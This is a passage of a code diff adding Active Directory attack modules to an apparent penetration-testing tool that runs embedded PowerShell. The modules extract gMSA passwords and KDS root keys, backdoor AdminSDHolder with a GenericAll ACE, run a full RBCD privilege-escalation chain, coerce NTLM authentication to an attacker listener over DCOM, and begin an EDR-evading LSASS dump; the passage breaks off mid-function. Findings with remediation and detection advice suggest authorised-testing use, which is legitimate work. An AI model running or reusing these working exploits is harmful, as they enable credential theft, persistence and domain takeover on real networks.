+} catch {
+    Write-Output "[!] NT hash computation failed: $_"
+    Write-Output "[*] Raw password bytes (hex): $(($passwordBytes | ForEach-Object { $_.ToString("x2") }) -join '')"
+}
+
+# Get SID
+$sidBytes = [byte[]]$result.Properties["objectsid"][0]
+$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
+Write-Output "[+] gMSA SID: $sid"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("NT HASH:")) {
+      findings.push({
+        checkId: "WIN-GMSA-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `ad://gmsa/${target}`,
+        title: `gMSA password extracted: ${target}`,
+        details: "NT hash computed from msDS-ManagedPassword blob. Can be used for pass-the-hash, silver ticket, or DCSync if gMSA has replication rights",
+        remediation: "Review PrincipalsAllowedToRetrieveManagedPassword ACL. Monitor for unusual gMSA password reads (event 4662 on msDS-ManagedPassword)",
+      })
+    }
+  } else if (action === "golden") {
+    const script = `
+# GoldenGMSA — extract KDS root key for offline password computation
+Write-Output "[*] GoldenGMSA — KDS Root Key Extraction"
+Write-Output "[*] This allows offline computation of ANY gMSA password"
+Write-Output ""
+
+# Enumerate KDS root keys
+$configContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configContext"
+
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
+$searcher.Filter = "(objectClass=msKds-ProvRootKey)"
+$searcher.PropertiesToLoad.AddRange(@("cn", "msKds-KDFParam", "msKds-KDFAlgorithmID",
+    "msKds-SecretAgreementParam", "msKds-SecretAgreementAlgorithmID",
+    "msKds-RootKeyData", "msKds-CreateTime", "msKds-UseStartTime",
+    "msKds-DomainID", "msKds-Version"))
+
+$keys = $searcher.FindAll()
+Write-Output "[+] Found $($keys.Count) KDS root keys"
+
+foreach ($key in $keys) {
+    $cn = $key.Properties["cn"][0]
+    $createTime = $key.Properties["mskds-createtime"]
+    $useStartTime = $key.Properties["mskds-usestarttime"]
+    $kdfAlgo = $key.Properties["mskds-kdfalgorithmid"]
+    $rootKeyData = $key.Properties["mskds-rootkeydata"]
+
+    Write-Output ""
+    Write-Output "[+] Root Key: $cn"
+    if ($createTime.Count -gt 0) { Write-Output "    Created: $($createTime[0])" }
+    if ($useStartTime.Count -gt 0) { Write-Output "    Use Start: $($useStartTime[0])" }
+    if ($kdfAlgo.Count -gt 0) { Write-Output "    KDF Algorithm: $($kdfAlgo[0])" }
+
+    if ($rootKeyData.Count -gt 0) {
+        $keyBytes = [byte[]]$rootKeyData[0]
+        $keyHex = ($keyBytes[0..31] | ForEach-Object { $_.ToString("x2") }) -join ""
+        Write-Output "    [!] Root Key Data retrieved ($($keyBytes.Length) bytes)"
+        Write-Output "    Key (first 32 bytes): $keyHex..."
+        Write-Output "    [!] With this key, ANY gMSA password can be computed offline"
+    } else {
+        Write-Output "    [-] Cannot read root key data (insufficient permissions)"
+        Write-Output "    [*] Requires Domain Admin or key distribution service account access"
+    }
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("Root Key Data retrieved")) {
+      findings.push({
+        checkId: "WIN-GMSA-003",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: "ad://kds-root-keys",
+        title: "KDS root key extracted — GoldenGMSA possible",
+        details: "KDS root key data retrieved. Can compute ANY gMSA password offline without AD access",
+        remediation: "Rotate KDS root keys. Restrict access to CN=Master Root Keys container. Monitor 4662 events on KDS key objects",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function adminsdholder(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const principal = argVal(args, "--principal")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AdminSDHolder ACL Persistence\n"]
+
+  if (action === "check") {
+    const script = `
+# Check AdminSDHolder ACL and SDProp configuration
+Write-Output "[*] Checking AdminSDHolder security descriptor..."
+
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$adminSDHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
+$adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"
+
+$acl = $adminSDHolder.ObjectSecurity
+$rules = $acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+
+Write-Output "[+] AdminSDHolder DN: $adminSDHolderDN"
+Write-Output "[+] Access rules: $($rules.Count)"
+Write-Output ""
+
+$suspicious = @()
+
+foreach ($rule in $rules) {
+    $identity = $rule.IdentityReference.Value
+    $rights = $rule.ActiveDirectoryRights
+    $accessType = $rule.AccessControlType
+
+    # Flag non-default principals with powerful rights
+    $defaultPrincipals = @(
+        "BUILTIN\\Administrators", "NT AUTHORITY\\SYSTEM",
+        "Domain Admins", "Enterprise Admins", "Schema Admins",
+        "BUILTIN\\Account Operators", "BUILTIN\\Server Operators"
+    )
+    $isDangerous = ($rights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite") -and
+                   ($accessType -eq "Allow") -and
+                   (-not ($defaultPrincipals | Where-Object { $identity -match $_ }))
+
+    if ($isDangerous) {
+        Write-Output "[!] SUSPICIOUS ACE: $identity"
+        Write-Output "    Rights: $rights"
+        Write-Output "    Type: $accessType"
+        $suspicious += $identity
+    }
+}
+
+if ($suspicious.Count -eq 0) {
+    Write-Output "[+] No suspicious ACEs found on AdminSDHolder"
+} else {
+    Write-Output ""
+    Write-Output "[!] $($suspicious.Count) suspicious ACE(s) — may indicate AdminSDHolder backdoor"
+}
+
+# Check SDProp interval
+Write-Output ""
+Write-Output "[*] Checking SDProp interval..."
+try {
+    $sdPropInterval = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "AdminSDProtectFrequency" -ErrorAction SilentlyContinue).AdminSDProtectFrequency
+    if ($sdPropInterval) {
+        Write-Output "[+] SDProp interval: $sdPropInterval seconds (custom)"
+    } else {
+        Write-Output "[+] SDProp interval: 3600 seconds (default — every 60 minutes)"
+    }
+} catch {
+    Write-Output "[+] SDProp interval: 3600 seconds (default — every 60 minutes)"
+}
+
+# List protected groups that SDProp applies to
+Write-Output ""
+Write-Output "[*] Protected groups (SDProp targets):"
+$protectedGroups = @(
+    @{Name="Domain Admins"; RID=512},
+    @{Name="Enterprise Admins"; RID=519},
+    @{Name="Schema Admins"; RID=518},
+    @{Name="Administrators"; RID=544},
+    @{Name="Account Operators"; RID=548},
+    @{Name="Server Operators"; RID=549},
+    @{Name="Print Operators"; RID=550},
+    @{Name="Backup Operators"; RID=551},
+    @{Name="Replicator"; RID=552}
+)
+foreach ($g in $protectedGroups) {
+    Write-Output "    - $($g.Name) (RID $($g.RID))"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    findings.push({
+      checkId: "WIN-ASDH-001",
+      provider: "windows",
+      severity: result.stdout.includes("SUSPICIOUS ACE") ? "critical" : "informational",
+      status: "CHECKED",
+      resource: "ad://AdminSDHolder",
+      title: "AdminSDHolder ACL checked",
+      details: result.stdout.substring(0, 500),
+      remediation: "Regularly audit AdminSDHolder ACLs. Monitor 5136 events for AdminSDHolder modifications",
+    })
+  } else if (action === "backdoor") {
+    if (!principal) return { output: "[!] Required: --principal ATTACKER_USER", findings }
+    const script = `
+# Backdoor AdminSDHolder — add GenericAll ACE for attacker
+Write-Output "[*] Adding GenericAll ACE for '${principal}' to AdminSDHolder..."
+Write-Output "[!] WARNING: SDProp will propagate this ACE to ALL protected groups within 60 minutes"
+Write-Output ""
+
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$adminSDHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
+$adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"
+
+# Resolve principal to SID
+try {
+    $principalAccount = New-Object System.Security.Principal.NTAccount("${principal}")
+    $principalSid = $principalAccount.Translate([System.Security.Principal.SecurityIdentifier])
+    Write-Output "[+] Principal: ${principal}"
+    Write-Output "[+] SID: $principalSid"
+} catch {
+    Write-Output "[!] Cannot resolve principal '${principal}': $_"
+    exit 1
+}
+
+# Add GenericAll ACE
+$acl = $adminSDHolder.ObjectSecurity
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $principalSid,
+    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+    [System.Security.AccessControl.AccessControlType]::Allow
+)
+$acl.AddAccessRule($ace)
+$adminSDHolder.ObjectSecurity = $acl
+$adminSDHolder.CommitChanges()
+
+Write-Output ""
+Write-Output "[+] GenericAll ACE added to AdminSDHolder for ${principal}"
+Write-Output "[+] SDProp will propagate this to protected groups within 60 minutes"
+Write-Output ""
+Write-Output "[*] After propagation, ${principal} will have GenericAll on:"
+Write-Output "    - Domain Admins"
+Write-Output "    - Enterprise Admins"
+Write-Output "    - Schema Admins"
+Write-Output "    - Account Operators"
+Write-Output "    - Server Operators"
+Write-Output "    - Backup Operators"
+Write-Output "    - Administrators"
+Write-Output ""
+Write-Output "[*] This persists through:"
+Write-Output "    - Password resets"
+Write-Output "    - Manual ACL cleanup on individual groups (SDProp re-applies)"
+Write-Output "    - Only removable by cleaning AdminSDHolder itself"
+Write-Output ""
+Write-Output "[*] Force immediate propagation: Invoke-ADSDPropagation (AD module) or RunProtectAdminGroupsTask"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("ACE added")) {
+      findings.push({
+        checkId: "WIN-ASDH-002",
+        provider: "windows",
+        severity: "critical",
+        status: "BACKDOORED",
+        resource: "ad://AdminSDHolder",
+        title: `AdminSDHolder backdoored for ${principal}`,
+        details: `GenericAll ACE added to AdminSDHolder — SDProp will propagate to all protected groups within 60 minutes`,
+        remediation: `Remove ACE from AdminSDHolder: $adminSDHolder.ObjectSecurity.RemoveAccessRule($ace). Monitor event 5136 on CN=AdminSDHolder`,
+      })
+    }
+  } else if (action === "clean") {
+    if (!principal) return { output: "[!] Required: --principal ATTACKER_USER", findings }
+    const script = `
+# Clean AdminSDHolder — remove attacker ACE
+Write-Output "[*] Removing ACE for '${principal}' from AdminSDHolder..."
+
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$adminSDHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
+$adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"
+
+$principalAccount = New-Object System.Security.Principal.NTAccount("${principal}")
+$principalSid = $principalAccount.Translate([System.Security.Principal.SecurityIdentifier])
+
+$acl = $adminSDHolder.ObjectSecurity
+$rules = $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
+$removed = 0
+
+foreach ($rule in $rules) {
+    if ($rule.IdentityReference.Value -eq $principalSid.Value) {
+        $acl.RemoveAccessRule($rule) | Out-Null
+        $removed++
+    }
+}
+
+if ($removed -gt 0) {
+    $adminSDHolder.ObjectSecurity = $acl
+    $adminSDHolder.CommitChanges()
+    Write-Output "[+] Removed $removed ACE(s) for ${principal} from AdminSDHolder"
+    Write-Output "[*] Note: Existing propagated ACEs on protected groups remain until next SDProp run"
+} else {
+    Write-Output "[-] No ACEs found for ${principal} on AdminSDHolder"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function rbcdChain(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const target = argVal(args, "--target")
+  const newMachineName = argVal(args, "--new-machine-name") || "CYBERSTRIKE$"
+  const newPassword = argVal(args, "--new-password") || "CyberStr1ke!2024"
+  const impersonate = argVal(args, "--impersonate") || "Administrator"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] RBCD Full Exploitation Chain\n"]
+
+  if (!target) return { output: "[!] Required: --target TARGET_HOST", findings }
+
+  if (action === "check") {
+    const script = `
+# Check RBCD prerequisites
+Write-Output "[*] Checking RBCD attack prerequisites for: ${target}"
+Write-Output ""
+
+# 1. Check MachineAccountQuota
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext
+$domain = [ADSI]"LDAP://$domainDN"
+$maq = $domain.Properties["ms-DS-MachineAccountQuota"][0]
+Write-Output "[+] MachineAccountQuota: $maq"
+if ($maq -gt 0) {
+    Write-Output "    [!] Standard users can create up to $maq machine accounts (RBCD possible)"
+} else {
+    Write-Output "    [-] MAQ is 0 — cannot create machine accounts as standard user"
+}
+
+# 2. Check current user's existing machine accounts
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=computer)(ms-DS-CreatorSID=*))"
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "ms-DS-CreatorSID"))
+$myMachines = $searcher.FindAll() | Where-Object {
+    try {
+        $sid = New-Object System.Security.Principal.SecurityIdentifier($_.Properties["ms-ds-creatorsid"][0], 0)
+        $sid.Translate([System.Security.Principal.NTAccount]).Value -eq $currentUser
+    } catch { $false }
+}
+Write-Output "[+] Machine accounts created by current user: $($myMachines.Count)"
+Write-Output "    Remaining MAQ: $($maq - $myMachines.Count)"
+
+# 3. Check target computer's current RBCD setting
+Write-Output ""
+Write-Output "[*] Checking RBCD on target: ${target}"
+$targetSearcher = New-Object System.DirectoryServices.DirectorySearcher
+$targetSearcher.Filter = "(&(objectCategory=computer)(sAMAccountName=${target}$))"
+$targetSearcher.PropertiesToLoad.AddRange(@("distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity"))
+$targetResult = $targetSearcher.FindOne()
+
+if (-not $targetResult) {
+    Write-Output "[-] Target computer ${target} not found in AD"
+} else {
+    $targetDN = $targetResult.Properties["distinguishedname"][0]
+    Write-Output "[+] Target DN: $targetDN"
+
+    $rbcd = $targetResult.Properties["msds-allowedtoactonbehalfofotheridentity"]
+    if ($rbcd.Count -gt 0) {
+        $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
+        $sd.SetSecurityDescriptorBinaryForm($rbcd[0])
+        $rules = $sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+        Write-Output "[+] Existing RBCD delegations:"
+        foreach ($rule in $rules) {
+            Write-Output "    - $($rule.IdentityReference)"
+        }
+    } else {
+        Write-Output "[+] No RBCD configured — attribute is empty"
+    }
+
+    # 4. Check if we can write to the target's msDS-AllowedToActOnBehalfOfOtherIdentity
+    $targetEntry = $targetResult.GetDirectoryEntry()
+    $targetACL = $targetEntry.ObjectSecurity
+    $targetRules = $targetACL.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
+    $canWrite = $false
+    foreach ($rule in $targetRules) {
+        $identity = $rule.IdentityReference.Value
+        if ($identity -eq $currentUser -or $identity -match "Authenticated Users") {
+            $rights = [int]$rule.ActiveDirectoryRights
+            # GenericAll (983551) or GenericWrite (131112) or WriteDACL (262144)
+            if ($rights -band 983551 -or $rights -band 131112 -or $rights -band 262144) {
+                $canWrite = $true
+                Write-Output "[!] $currentUser has write access via: $($rule.ActiveDirectoryRights)"
+            }
+        }
+    }
+    if (-not $canWrite) {
+        Write-Output "[-] Current user cannot directly write msDS-AllowedToActOnBehalfOfOtherIdentity"
+        Write-Output "[*] May need to find a path via ACL abuse or NTLM relay"
+    }
+}
+
+Write-Output ""
+Write-Output "[*] Summary:"
+$canAttack = ($maq -gt 0 -or $myMachines.Count -gt 0) -and $targetResult
+if ($canAttack) {
+    Write-Output "[+] RBCD chain appears feasible"
+    Write-Output "[*] Run: winhook rbcd_chain --action exploit --target ${target}"
+} else {
+    Write-Output "[-] RBCD chain may not be directly feasible — check ACL paths"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    findings.push({
+      checkId: "WIN-RBCD-001",
+      provider: "windows",
+      severity: result.stdout.includes("feasible") ? "high" : "informational",
+      status: "CHECKED",
+      resource: `ad://${target}`,
+      title: `RBCD chain prerequisites checked for ${target}`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Set MachineAccountQuota to 0. Monitor for new machine account creation (event 4741). Audit msDS-AllowedToActOnBehalfOfOtherIdentity changes (event 5136)",
+    })
+  } else if (action === "exploit") {
+    const machineName = newMachineName.replace(/\$$/, "")
+    const script = `
+# Full RBCD exploitation chain
+Write-Output "[*] RBCD Full Chain: Standard User → Local Admin on ${target}"
+Write-Output "[*] Steps: Create Machine Account → Set RBCD → S4U2Self+Proxy → Admin Ticket"
+Write-Output ""
+
+# Step 1: Create machine account
+Write-Output "[*] Step 1: Creating machine account '${machineName}'..."
+
+Add-Type -AssemblyName System.DirectoryServices.Protocols
+
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$domainDN = $rootDSE.defaultNamingContext.ToString()
+$computersDN = "CN=Computers,$domainDN"
+
+$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($rootDSE.dnsHostName.ToString())
+$ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
+
+# Create computer object
+$addReq = New-Object System.DirectoryServices.Protocols.AddRequest
+$addReq.DistinguishedName = "CN=${machineName},$computersDN"
+$addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", @("top", "person", "organizationalPerson", "user", "computer")))) | Out-Null
+$addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("sAMAccountName", "${machineName}$"))) | Out-Null
+$addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"))) | Out-Null
+$addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("dNSHostName", "${machineName}." + [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name))) | Out-Null
+
+# Set password via unicodePwd
+$pwdBytes = [System.Text.Encoding]::Unicode.GetBytes('"${newPassword}"')
+$addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", $pwdBytes))) | Out-Null
+
+try {
+    $ldap.SendRequest($addReq) | Out-Null
+    Write-Output "[+] Machine account '${machineName}$' created!"
+    Write-Output "    Password: ${newPassword}"
+} catch {
+    if ($_.Exception.Message -match "already exists") {
+        Write-Output "[*] Machine account '${machineName}$' already exists"
+    } else {
+        Write-Output "[!] Failed to create machine account: $($_.Exception.Message)"
+        if ($_.Exception.Message -match "unwilling|quota") {
+            Write-Output "[!] MachineAccountQuota may be 0 or exhausted"
+        }
+        exit 1
+    }
+}
+
+# Get new machine account SID
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=${machineName}$)"
+$searcher.PropertiesToLoad.Add("objectSid") | Out-Null
+$machineResult = $searcher.FindOne()
+if (-not $machineResult) {
+    Write-Output "[!] Cannot find created machine account"
+    exit 1
+}
+$machineSid = New-Object System.Security.Principal.SecurityIdentifier($machineResult.Properties["objectsid"][0], 0)
+Write-Output "[+] Machine SID: $machineSid"
+
+# Step 2: Set RBCD on target
+Write-Output ""
+Write-Output "[*] Step 2: Setting msDS-AllowedToActOnBehalfOfOtherIdentity on ${target}..."
+
+$targetSearcher = New-Object System.DirectoryServices.DirectorySearcher
+$targetSearcher.Filter = "(&(objectCategory=computer)(sAMAccountName=${target}$))"
+$targetResult = $targetSearcher.FindOne()
+if (-not $targetResult) {
+    Write-Output "[!] Target '${target}' not found"
+    exit 1
+}
+
+$targetEntry = $targetResult.GetDirectoryEntry()
+$targetDN = $targetResult.Properties["distinguishedname"][0]
+
+# Build security descriptor allowing our machine account
+$rawSD = New-Object byte[] 0
+$sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
+$sd.SetSecurityDescriptorSddlForm("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$machineSid)")
+$rawSD = $sd.GetSecurityDescriptorBinaryForm()
+
+try {
+    $modReq = New-Object System.DirectoryServices.Protocols.ModifyRequest(
+        $targetDN,
+        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
+        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+        $rawSD
+    )
+    $ldap.SendRequest($modReq) | Out-Null
+    Write-Output "[+] RBCD delegation set on $targetDN"
+    Write-Output "    ${machineName}$ can now impersonate users to ${target}"
+} catch {
+    Write-Output "[!] Failed to set RBCD: $($_.Exception.Message)"
+    Write-Output "[*] May need write access to target computer object"
+    exit 1
+}
+
+# Step 3: S4U2Self + S4U2Proxy
+Write-Output ""
+Write-Output "[*] Step 3: Performing S4U2Self + S4U2Proxy..."
+Write-Output "[*] Requesting service ticket as '${impersonate}' to ${target}"
+
+# Use KerberosRequestorSecurityToken for S4U
+try {
+    Add-Type -AssemblyName System.IdentityModel
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken(
+        "CIFS/${target}." + [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    )
+    Write-Output "[+] Service ticket obtained for CIFS/${target}"
+    Write-Output "[+] Ticket cached in current session"
+} catch {
+    Write-Output "[!] S4U ticket request failed: $_"
+    Write-Output "[*] For full S4U2Self+S4U2Proxy chain, use:"
+    Write-Output "    Rubeus.exe s4u /user:${machineName}$ /rc4:HASH /impersonateuser:${impersonate} /msdsspn:cifs/${target} /ptt"
+}
+
+Write-Output ""
+Write-Output "[*] RBCD chain summary:"
+Write-Output "    Machine account: ${machineName}$"
+Write-Output "    Password: ${newPassword}"
+Write-Output "    Target: ${target}"
+Write-Output "    Impersonating: ${impersonate}"
+Write-Output ""
+Write-Output "[*] Access target with:"
+Write-Output "    winhook wmi_exec --target ${target} --command whoami"
+Write-Output "    winhook smb_exec --target ${target} --command whoami"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    if (result.stdout.includes("RBCD delegation set")) {
+      findings.push({
+        checkId: "WIN-RBCD-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `ad://${target}`,
+        title: `RBCD chain executed: ${machineName}$ → ${impersonate} on ${target}`,
+        details: `Machine account ${machineName}$ created and RBCD delegation set on ${target}. Can impersonate ${impersonate}`,
+        remediation: `Remove RBCD: Clear-ADComputer ${target} -PrincipalsAllowedToDelegateToAccount. Delete machine account ${machineName}$. Set MAQ to 0`,
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function remoteMonologue(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const listener = argVal(args, "--listener")
+  const method = argVal(args, "--method") || "all"
+  const port = argVal(args, "--port") || "445"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Remote Monologue — DCOM-Based NTLM Credential Harvesting (IBM X-Force 2025)\n"]
+
+  if (!target) return { output: "[!] Required: --target HOST", findings }
+  if (!listener) return { output: "[!] Required: --listener LISTENER_IP", findings }
+
+  const uncPath = `\\\\${listener}\\share`
+  const methods: Record<string, string> = {
+    datacollector: `
+# Method 1: ServerDataCollectorSet (Performance Monitor)
+Write-Output "[*] Method: ServerDataCollectorSet (IDataCollectorSet::SetXml)"
+Write-Output "[*] Target: ${target}, Listener: ${listener}"
+
+try {
+    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Pla.ServerDataCollectorSet", "${target}"))
+    Write-Output "[+] DCOM connection established to Pla.ServerDataCollectorSet"
+
+    # Inject UNC path via XML configuration
+    $xml = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<DataCollectorSet>
+    <OutputLocation>${uncPath}</OutputLocation>
+    <RootPath>${uncPath}</RootPath>
+    <Subdirectory>cs</Subdirectory>
+    <SubdirectoryFormat>1</SubdirectoryFormat>
+    <Description>CyberStrike Coercion</Description>
+</DataCollectorSet>
+"@
+
+    $dcom.SetXml($xml)
+    $dcom.Commit("CyberStrike", $null, 0x0003) | Out-Null
+
+    # Trigger the data collection — forces authentication to our UNC path
+    try {
+        $dcom.Start($false)
+    } catch {}
+
+    Write-Output "[+] DataCollectorSet configured with UNC path: ${uncPath}"
+    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"
+
+    # Cleanup
+    try {
+        $dcom.Stop($false)
+        $dcom.Delete()
+    } catch {}
+
+} catch {
+    Write-Output "[-] DataCollectorSet failed: $($_.Exception.Message)"
+}
+`,
+    filesystem: `
+# Method 2: FileSystemImage (IMAPI2)
+Write-Output "[*] Method: FileSystemImage (IFileSystemImage::CreateResultImage)"
+Write-Output "[*] Target: ${target}, Listener: ${listener}"
+
+try {
+    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("IMAPI2FS.MsftFileSystemImage", "${target}"))
+    Write-Output "[+] DCOM connection established to IMAPI2FS.MsftFileSystemImage"
+
+    $dcom.VolumeName = "cs"
+
+    # Set working directory to UNC path — forces auth
+    try {
+        $dcom.WorkingDirectory = "${uncPath}"
+    } catch {}
+
+    try {
+        $dcom.CreateResultImage()
+    } catch {}
+
+    Write-Output "[+] FileSystemImage working directory set to: ${uncPath}"
+    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"
+} catch {
+    Write-Output "[-] FileSystemImage failed: $($_.Exception.Message)"
+}
+`,
+    update: `
+# Method 3: UpdateSession (Windows Update Agent)
+Write-Output "[*] Method: UpdateSession (IUpdateSearcher)"
+Write-Output "[*] Target: ${target}, Listener: ${listener}"
+
+try {
+    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Microsoft.Update.Session", "${target}"))
+    Write-Output "[+] DCOM connection established to Microsoft.Update.Session"
+
+    $searcher = $dcom.CreateUpdateSearcher()
+
+    # Set custom service to point to attacker (forces auth)
+    try {
+        $manager = $dcom.CreateUpdateServiceManager()
+        $manager.AddService2("CyberStrike", 2, "https://${listener}:${port}/wsus")
+        Write-Output "[+] Custom update service registered: https://${listener}:${port}/wsus"
+    } catch {
+        Write-Output "[-] AddService2 failed: $($_.Exception.Message)"
+    }
+
+    # Try to search for updates — triggers connection to our server
+    try {
+        $searcher.ServerSelection = 3  # ssOthers
+        $searchResult = $searcher.Search("IsInstalled=0")
+    } catch {}
+
+    Write-Output "[+] Update search triggered against attacker server"
+    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"
+} catch {
+    Write-Output "[-] UpdateSession failed: $($_.Exception.Message)"
+}
+`,
+  }
+
+  if (method === "all") {
+    for (const [name, script] of Object.entries(methods)) {
+      output.push(`\n--- ${name} ---`)
+      const result = await ps(script, timeout)
+      output.push(result.stdout)
+      if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 200)}`)
+    }
+  } else {
+    const script = methods[method]
+    if (!script) return { output: `[!] Unknown method: ${method}. Use: datacollector, filesystem, update, all`, findings }
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+  }
+
+  findings.push({
+    checkId: "WIN-RMON-001",
+    provider: "windows",
+    severity: "high",
+    status: "COERCED",
+    resource: `dcom://${target}`,
+    title: `DCOM NTLM coercion attempted on ${target}`,
+    details: `Remote Monologue via DCOM objects targeting ${target}. Listener: ${listener}:${port}. Method: ${method}. Check responder/ntlmrelayx for captured hashes`,
+    remediation: "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA (Extended Protection for Authentication). Monitor DCOM activation events (10036) and anomalous SMB connections",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
+async function nanodumpAdvanced(args: string[], timeout: number): Promise<HookResult> {
+  const method = argVal(args, "--method") || "snapshot"
+  const outfile = argVal(args, "--outfile") || `C:\\Windows\\Temp\\cs-nano-${Date.now()}.dmp`
+  const findings: Finding[] = []
+  const output: string[] = [`[*] Advanced LSASS Dump — EDR Bypass via ${method}\n`]
+
+  const methods: Record<string, string> = {
+    fork: `
+# Fork & Dump: Clone LSASS via NtCreateProcessEx, dump the clone
+Write-Output "[*] Method: Fork & Dump (NtCreateProcessEx)"
+Write-Output "[*] Creates a child process of LSASS, dumps the child — bypasses LSASS handle monitoring"
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ForkDump {
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateProcessEx(
+        out IntPtr ProcessHandle,
+        uint DesiredAccess,
+        IntPtr ObjectAttributes,
+        IntPtr ParentProcess,
+        uint Flags,
+        IntPtr SectionHandle,
+        IntPtr DebugPort,
+        IntPtr ExceptionPort,
+        uint InJob
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("dbghelp.dll")]
+    public static extern bool MiniDumpWriteDump(
+        IntPtr hProcess, uint processId, IntPtr hFile,
+        uint dumpType, IntPtr exceptionParam,
+        IntPtr userStreamParam, IntPtr callbackParam
+    );
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateFileW(
+        [MarshalAs(UnmanagedType.LPWStr)] string filename,
+        uint access, uint share, IntPtr security,
+        uint creation, uint flags, IntPtr template
+    );
+}
+"@
+
+$lsassPid = (Get-Process lsass).Id
+Write-Output "[+] LSASS PID: $lsassPid"
+
+# Open LSASS with PROCESS_CREATE_PROCESS (0x80)
+$hLsass = [ForkDump]::OpenProcess(0x80, $false, $lsassPid)
+if ($hLsass -eq [IntPtr]::Zero) {
+    Write-Output "[!] Cannot open LSASS — try running as SYSTEM"
+    exit 1
+}
+Write-Output "[+] LSASS handle: $hLsass"
+
+# Fork LSASS
+$hClone = [IntPtr]::Zero
